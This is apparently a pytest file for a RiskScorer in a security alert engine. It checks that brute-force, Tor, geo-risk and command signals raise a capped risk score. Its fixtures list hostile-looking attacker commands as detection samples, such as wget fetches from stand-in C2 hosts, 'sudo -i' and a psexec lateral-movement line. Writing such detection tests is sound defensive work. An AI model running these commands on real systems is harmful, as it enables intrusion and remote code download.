from services.alert_engine import RiskScorer


def test_low_activity_scores_low():
    score, _ = RiskScorer.score({"failed_auth_count": 1})
    assert score < 20


def test_brute_force_and_abuseipdb_combine():
    score, breakdown = RiskScorer.score(
        {
            "failed_auth_count": 40,
            "abuseipdb_score": 90,
            "is_tor": True,
            "country_iso": "RU",
        }
    )
    assert score >= 30
    assert breakdown["brute_force_pattern"] > 0
    assert breakdown["known_tor_exit"] > 0
    assert breakdown["geo_risk"] > 0


def test_command_signals_detected():
    score, breakdown = RiskScorer.score(
        {
            "commands": ["wget http://x/c2", "sudo -i", "psexec \\\\HOST cmd"],
            "http_path": "/gate.php",
            "command_count": 20,
            "download_attempt": True,
        }
    )
    assert breakdown["c2_ioc_match"] > 0
    assert breakdown["privilege_escalation"] > 0
    assert breakdown["lateral_movement"] > 0
    assert breakdown["download_attempt"] > 0
    assert score > 15


def test_score_capped_at_100():
    ctx = {
        "failed_auth_count": 500,
        "abuseipdb_score": 100,
        "is_tor": True,
        "yara_match": "Emotet",
        "mitre_techniques": ["T1110", "T1078", "T1059", "T1005"],
        "country_iso": "KP",
        "commands": ["sudo -i", "psexec", "wget http://c2/CVE-2021-44228"],
        "http_path": "/c2/gate.php",
        "payload": "A" * 1024,
        "unique_dest_ports": 50,
        "command_count": 500,
        "download_attempt": True,
        "session_duration_seconds": 9000,
        "new_ip": True,
        "hour_of_day": 3,
    }
    score, _ = RiskScorer.score(ctx)
    assert 0 <= score <= 100
